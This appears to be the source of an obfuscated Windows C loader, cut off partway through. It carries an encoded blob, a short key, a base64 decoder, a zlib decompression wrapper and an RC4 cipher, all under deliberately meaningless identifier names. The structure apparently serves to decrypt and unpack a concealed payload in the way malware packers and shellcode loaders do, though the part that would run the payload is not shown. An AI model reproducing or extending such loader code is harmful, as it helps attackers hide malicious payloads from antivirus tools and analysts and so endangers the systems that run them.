#include <windows.h>
#include <string.h>
#include <zlib.h>
#include <stdio.h>


unsigned char l6VbJUvZ2_H6se7fNrff_HzsVuU9n5XYdIAog5VNLQDP6iqYjrUmcTohlWUKaqCYOybH9fXOxWuQTqgOhaHy2OVJcDFWfh7vDBLGHbFEiL_J34Ef6iZPireNuAsPtGaEA6orZd31C0udSnCddd8C2AEv2LOJrFYE68DNtgWqyCKof04dOFrDfeeAyjX5Kz9sYPmIn5CAhdM6PI6T0s5QPGKo5ptSjXZqXdMnc[] = "\x68\x34\x56\x39\x4d\x30\x33\x54\x57\x6c\x44\x65\x36\x53\x75\x52\x61\x72\x77\x42\x7a\x68\x76\x78\x57\x50\x31\x74\x46\x59\x4d\x46\x2f\x46\x4f\x50\x62\x6b\x52\x69\x2f\x48\x73\x6a\x4a\x72\x37\x7a\x41\x4c\x74\x46\x4a\x72\x38\x2f\x37\x53\x78\x72\x46\x32\x44\x39\x36\x6e\x63\x64\x36\x77\x39\x47\x72\x4c\x38\x65\x64\x74\x6d\x4d\x4b\x72\x36\x33\x4f\x46\x71\x68\x62\x4c\x4a\x52\x42\x42\x64\x44\x72\x6c\x58\x2f\x47\x37\x64\x37\x53\x4f\x34\x4b\x53\x37\x36\x33\x58\x4f\x39\x38\x30\x57\x43\x6f\x7a\x38\x49\x65\x64\x66\x30\x76\x6b\x56\x43\x49\x43\x49\x71\x49\x63\x4b\x42\x62\x6c\x74\x6e\x61\x70\x39\x79\x4b\x73\x4c\x77\x43\x7a\x6b\x6c\x76\x35\x51\x79\x2f\x47\x38\x74\x49\x6e\x61\x4c\x67\x57\x52\x4a\x72\x69\x43\x44\x36\x4c\x69\x54\x2f\x67\x58\x4d\x54\x56\x4c\x43\x68\x7a\x39\x47\x68\x66\x6c\x59\x43\x47\x67\x50\x79\x35\x73\x35\x4e\x4c\x6f\x52\x5a\x78\x30\x63\x74\x68\x68\x5a\x39\x61\x4c\x49\x49\x6c\x70\x48\x5a\x63\x5a\x36\x53\x72\x45\x70\x47\x43\x62\x53\x68\x2b\x77\x41\x5a\x65\x31\x78\x33\x6e\x31\x70\x33\x33\x30\x72\x56\x33\x2b\x37\x78\x50\x72\x71\x43\x61\x37\x6c\x43\x4c\x55\x75\x55\x54\x2b\x69\x4f\x41\x52\x4e\x4a\x64\x4d\x2b\x74\x79\x39\x75\x48\x59\x77\x44\x54\x4f\x41\x50\x7a\x36\x52\x74\x50\x64\x2f\x30\x64\x69\x2b\x54\x45\x59\x71\x6c\x59\x38\x79\x31\x4a\x2b\x4a\x70\x4c\x55\x47\x70\x4b\x50\x45\x41\x64\x73\x5a\x2b\x77\x67\x36\x76\x62\x35\x59\x69\x70\x53\x78\x4f\x69\x4e\x6a\x62\x73\x72\x69\x49\x6b\x65\x2b\x4f\x41\x72\x75\x79\x65\x67\x45\x41\x51\x34\x7a\x62\x56\x64\x74\x6b\x54\x36\x5a\x79\x59\x42\x76\x36\x6d\x4a\x66\x51\x3d";
unsigned char eJeqyOUCXkDN[] = "\x10\x95\x00\xf4";
unsigned char JrnhmLCQSuOJwZHyQ9OrnvtNKtAnUjsvYnvR7r6WdCfEKtdnLDEFRhPTpAO1RJ43JCyV5lRmX5pLRkgqIrdIQJCgAlUWYKr3FGQchRbN46ruiDaIrrQ4OlMRbAYbW8ngQ34ueVVNDTEZcUrw6Be[] = "\xc8\x0f\xef\xcf\xf2\x0a\x0e\xcc";
#define KEY_SIZE 3


static const unsigned char s9dxEq1fSvMOzKqdi7CL1NMVbGRtCOn7JROU5HyOo[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};


int mZrAZIAT47ledjIBXAYcXjsbY_bJXuyFHoP0cghBPKVuzQs9xq0XyGEyFHAIGyVS3SZw5RNnKsfs9xb9TdF3BNQll64P2le1Rrn_J1lGl9IBTXq1DXYjfTN_ii_BM55XgA1X1(const unsigned char *yQuSltSgoTKFVPvFAwYPfiySUcEdffKdb8ZrulMaxOf1xh, int LOrKEVktX9vUVuu8ZWyhVsMtldccp, unsigned char *QgJ4OFUijjJ0UycVcRKwXHBJyi4_SU0rLZ0NGCIkww_684cUX68ohRWEPlEiTZ6u_BAYSNU8YE0p5krHxNa8PTp2yAyc7jUkn27dfon4q2tw18Nv2oZFdiRiVw5s_PiSvKwas2lt6d) {
    
    int FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4, mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl = 0;
    unsigned char m6NZrmu0QnLso1x54PUYblm_o4IYpfDuf9k2KqFsst7DsWBiH1CxxDKg4q1Hn6AvBl516lVid1MrSLWKeCYgPbatAY90vPj9DptJ33iXXz031aHWBZaNqvbA0FI_lm, b, c, d;
    
    for (FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = 0; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 < LOrKEVktX9vUVuu8ZWyhVsMtldccp; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 += 4) {
        m6NZrmu0QnLso1x54PUYblm_o4IYpfDuf9k2KqFsst7DsWBiH1CxxDKg4q1Hn6AvBl516lVid1MrSLWKeCYgPbatAY90vPj9DptJ33iXXz031aHWBZaNqvbA0FI_lm = s9dxEq1fSvMOzKqdi7CL1NMVbGRtCOn7JROU5HyOo[yQuSltSgoTKFVPvFAwYPfiySUcEdffKdb8ZrulMaxOf1xh[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4]];
        b = s9dxEq1fSvMOzKqdi7CL1NMVbGRtCOn7JROU5HyOo[yQuSltSgoTKFVPvFAwYPfiySUcEdffKdb8ZrulMaxOf1xh[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 + 1]];
        c = s9dxEq1fSvMOzKqdi7CL1NMVbGRtCOn7JROU5HyOo[yQuSltSgoTKFVPvFAwYPfiySUcEdffKdb8ZrulMaxOf1xh[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 + 2]];
        d = s9dxEq1fSvMOzKqdi7CL1NMVbGRtCOn7JROU5HyOo[yQuSltSgoTKFVPvFAwYPfiySUcEdffKdb8ZrulMaxOf1xh[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 + 3]];
        
        QgJ4OFUijjJ0UycVcRKwXHBJyi4_SU0rLZ0NGCIkww_684cUX68ohRWEPlEiTZ6u_BAYSNU8YE0p5krHxNa8PTp2yAyc7jUkn27dfon4q2tw18Nv2oZFdiRiVw5s_PiSvKwas2lt6d[mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl++] = (m6NZrmu0QnLso1x54PUYblm_o4IYpfDuf9k2KqFsst7DsWBiH1CxxDKg4q1Hn6AvBl516lVid1MrSLWKeCYgPbatAY90vPj9DptJ33iXXz031aHWBZaNqvbA0FI_lm << 2) | (b >> 4);
        if (c != 64) QgJ4OFUijjJ0UycVcRKwXHBJyi4_SU0rLZ0NGCIkww_684cUX68ohRWEPlEiTZ6u_BAYSNU8YE0p5krHxNa8PTp2yAyc7jUkn27dfon4q2tw18Nv2oZFdiRiVw5s_PiSvKwas2lt6d[mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl++] = (b << 4) | (c >> 2);
        if (d != 64) QgJ4OFUijjJ0UycVcRKwXHBJyi4_SU0rLZ0NGCIkww_684cUX68ohRWEPlEiTZ6u_BAYSNU8YE0p5krHxNa8PTp2yAyc7jUkn27dfon4q2tw18Nv2oZFdiRiVw5s_PiSvKwas2lt6d[mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl++] = (c << 6) | d;
    }
    
    return mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl;
}


int iPcnrPS8NHlbnBVHwpejtPjKBG34zkMo8gIOH6d_6k5yQ65yAJqMN9P2Lcmf12E6iS5UqkDQTWWUDdT1VRlDdXL6WhHiPyixdzSkxGSz8Acwy3akoNPCIb_neeDFwE78pPBes9rYxsGa(const unsigned char *yQuSltSgoTKFVPvFAwYPfiySUcEdffKdb8ZrulMaxOf1xh, int LOrKEVktX9vUVuu8ZWyhVsMtldccp, unsigned char *QgJ4OFUijjJ0UycVcRKwXHBJyi4_SU0rLZ0NGCIkww_684cUX68ohRWEPlEiTZ6u_BAYSNU8YE0p5krHxNa8PTp2yAyc7jUkn27dfon4q2tw18Nv2oZFdiRiVw5s_PiSvKwas2lt6d, int edu109ZaO6KshSUJLcqwmPGm5STy_ZF2xgBPa98aMptLkLMv14oYt7SoW_X9dIojm0) {
    
    uLongf dest_len = (uLongf)edu109ZaO6KshSUJLcqwmPGm5STy_ZF2xgBPa98aMptLkLMv14oYt7SoW_X9dIojm0;
    int se5T8A_RYxcjtlPXi0iKAo3Hx3GLLQp3HIM0c5ReHlbFXlQw7cciSGOMssUH4Rjqe_wI2xRR32srio7vIrbBd6iV6fVXItLws4X41CFiSdyarn9jMwjKY337vevQpSrEbV67qlN0ypVBmVT4o7RWuXwT3cu609tXLJvBcnK2mEdD2PF7tkGissQetbHk5IUyLhaUMnOI_neMiJxIAo71kR00A49 = uncompress(QgJ4OFUijjJ0UycVcRKwXHBJyi4_SU0rLZ0NGCIkww_684cUX68ohRWEPlEiTZ6u_BAYSNU8YE0p5krHxNa8PTp2yAyc7jUkn27dfon4q2tw18Nv2oZFdiRiVw5s_PiSvKwas2lt6d, &dest_len, yQuSltSgoTKFVPvFAwYPfiySUcEdffKdb8ZrulMaxOf1xh, (uLong)LOrKEVktX9vUVuu8ZWyhVsMtldccp);
    
    if (se5T8A_RYxcjtlPXi0iKAo3Hx3GLLQp3HIM0c5ReHlbFXlQw7cciSGOMssUH4Rjqe_wI2xRR32srio7vIrbBd6iV6fVXItLws4X41CFiSdyarn9jMwjKY337vevQpSrEbV67qlN0ypVBmVT4o7RWuXwT3cu609tXLJvBcnK2mEdD2PF7tkGissQetbHk5IUyLhaUMnOI_neMiJxIAo71kR00A49 != Z_OK) {
        
        return 0;
    }
    
    
    return (int)dest_len;
}


typedef struct {
    unsigned char NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[256];
    unsigned char FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4;
    unsigned char mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl;
} mO188XbQj9hC5RMj0TCPAhHM7KwFdUWYIDTSE8SmkjzU8Ot1szl8iXWgFTj_SXclyqcnR5aBfMZnaDekzzORq_5Lf6khCppFi9soozgF_5eQRWPjJH1799fm4VtmZP1bDiLb8YaQGWAcB_GnDObmY_dSiAihvDcwB9AHj6i6Yze5JHk6Ni8EtNXjP9UOxcoFTMHKF3pWgbI1aodG3;


void HUt8Q9_f(mO188XbQj9hC5RMj0TCPAhHM7KwFdUWYIDTSE8SmkjzU8Ot1szl8iXWgFTj_SXclyqcnR5aBfMZnaDekzzORq_5Lf6khCppFi9soozgF_5eQRWPjJH1799fm4VtmZP1bDiLb8YaQGWAcB_GnDObmY_dSiAihvDcwB9AHj6i6Yze5JHk6Ni8EtNXjP9UOxcoFTMHKF3pWgbI1aodG3 *st, const unsigned char *key, int z6pkm4lEQ2ptiwQdspI76RTqwToOMl0WMTRrE9ZKYHSLFyJYjlsTF4Ok03SEvuoYjCvEYspD3HE) {
    int FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4, mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl = 0;
    unsigned char Nm0fotX7grYMMSWcX14FnE2xxhj8XrNpKCa_j313FMV_TMOQy2CRs7pSb_gtBcdbiCTWCzxwSmNzVrU6GCgXDcOcSM1zocpuqjLhlV8VNatqUSvCQ2;
    
    for (FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = 0; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 < 256; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4++) st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4] = (unsigned char)FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4;
    st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = 0;
    st->mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl = 0;
    
    for (FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = 0; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 < 256; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4++) {
        mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl = (mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl + st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4] + key[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 % z6pkm4lEQ2ptiwQdspI76RTqwToOMl0WMTRrE9ZKYHSLFyJYjlsTF4Ok03SEvuoYjCvEYspD3HE]) % 256;
        Nm0fotX7grYMMSWcX14FnE2xxhj8XrNpKCa_j313FMV_TMOQy2CRs7pSb_gtBcdbiCTWCzxwSmNzVrU6GCgXDcOcSM1zocpuqjLhlV8VNatqUSvCQ2 = st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4];
        st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4] = st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl];
        st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl] = Nm0fotX7grYMMSWcX14FnE2xxhj8XrNpKCa_j313FMV_TMOQy2CRs7pSb_gtBcdbiCTWCzxwSmNzVrU6GCgXDcOcSM1zocpuqjLhlV8VNatqUSvCQ2;
    }
    st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = 0;
    st->mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl = 0;
}


void sfsvdpjlx6j1_Tg6C7mLdgS72roe3Z3IIrBwIVYxhRh38v2Ki7bUoB7hhb1jn9QK8y8bYcbrEMzksNBdia96vhEWZZKn4LDyMhAreYRZJY2xBHVwfJR_vHYidUBCDCdfvS(mO188XbQj9hC5RMj0TCPAhHM7KwFdUWYIDTSE8SmkjzU8Ot1szl8iXWgFTj_SXclyqcnR5aBfMZnaDekzzORq_5Lf6khCppFi9soozgF_5eQRWPjJH1799fm4VtmZP1bDiLb8YaQGWAcB_GnDObmY_dSiAihvDcwB9AHj6i6Yze5JHk6Ni8EtNXjP9UOxcoFTMHKF3pWgbI1aodG3 *st, unsigned char *WvwK333U_w8CjDUjuYwQ44PZYh2DlVfk2MAHq0geE5L6xhs6DC1OdoGWwWbBUtsf_iI1WvQbUFrthBzM2cqR3hWx5iFStAbvD7p3Ti1dLxI, int ySfnnRrX3WpfIqxZj5JCSUR2R7rjoYY3Tt6EF4qWCcpS) {
    int XUGedjgcvNqAWTGR_RRXNY3e8xnAAPSafZMZAfDmi79n2YfD8cl3dX2CJtTVGRDsl1OASCffmNtkhjg_w9IhRHm_iKrVButa4EItMhFzaHfP_IGuto3UiwJvDCQavPASZy5R0VRcUq55VikVU7eHOPR44EgHVlj2hsYxcD7P9MzvwtZxjBElPj0yWU50O7_cBBUc_bgJcnUm;
    unsigned char Nm0fotX7grYMMSWcX14FnE2xxhj8XrNpKCa_j313FMV_TMOQy2CRs7pSb_gtBcdbiCTWCzxwSmNzVrU6GCgXDcOcSM1zocpuqjLhlV8VNatqUSvCQ2, K;
    
    for (XUGedjgcvNqAWTGR_RRXNY3e8xnAAPSafZMZAfDmi79n2YfD8cl3dX2CJtTVGRDsl1OASCffmNtkhjg_w9IhRHm_iKrVButa4EItMhFzaHfP_IGuto3UiwJvDCQavPASZy5R0VRcUq55VikVU7eHOPR44EgHVlj2hsYxcD7P9MzvwtZxjBElPj0yWU50O7_cBBUc_bgJcnUm = 0; XUGedjgcvNqAWTGR_RRXNY3e8xnAAPSafZMZAfDmi79n2YfD8cl3dX2CJtTVGRDsl1OASCffmNtkhjg_w9IhRHm_iKrVButa4EItMhFzaHfP_IGuto3UiwJvDCQavPASZy5R0VRcUq55VikVU7eHOPR44EgHVlj2hsYxcD7P9MzvwtZxjBElPj0yWU50O7_cBBUc_bgJcnUm < ySfnnRrX3WpfIqxZj5JCSUR2R7rjoYY3Tt6EF4qWCcpS; XUGedjgcvNqAWTGR_RRXNY3e8xnAAPSafZMZAfDmi79n2YfD8cl3dX2CJtTVGRDsl1OASCffmNtkhjg_w9IhRHm_iKrVButa4EItMhFzaHfP_IGuto3UiwJvDCQavPASZy5R0VRcUq55VikVU7eHOPR44EgHVlj2hsYxcD7P9MzvwtZxjBElPj0yWU50O7_cBBUc_bgJcnUm++) {
        st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = (st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 + 1) % 256;
        st->mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl = (st->mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl + st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4]) % 256;
        Nm0fotX7grYMMSWcX14FnE2xxhj8XrNpKCa_j313FMV_TMOQy2CRs7pSb_gtBcdbiCTWCzxwSmNzVrU6GCgXDcOcSM1zocpuqjLhlV8VNatqUSvCQ2 = st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4];
        st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4] = st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[st->mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl];
        st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[st->mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl] = Nm0fotX7grYMMSWcX14FnE2xxhj8XrNpKCa_j313FMV_TMOQy2CRs7pSb_gtBcdbiCTWCzxwSmNzVrU6GCgXDcOcSM1zocpuqjLhlV8VNatqUSvCQ2;
